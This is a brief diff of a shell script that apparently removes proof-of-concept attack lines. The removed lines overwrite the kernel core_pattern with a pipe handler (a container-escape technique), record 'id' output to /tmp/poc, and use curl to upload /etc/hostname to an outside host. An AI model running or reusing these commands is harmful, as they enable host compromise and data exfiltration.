@@ -1,5 +1,2 @@
 #!/bin/sh
 echo aaa > bbb
-echo "|/path/to/your_handler %p %u %g %s %t %e" > /proc/sys/kernel/core_pattern
-id > /tmp/poc
-curl -F "=@/etc/hostname" upload.yuvalavra.com/plspls
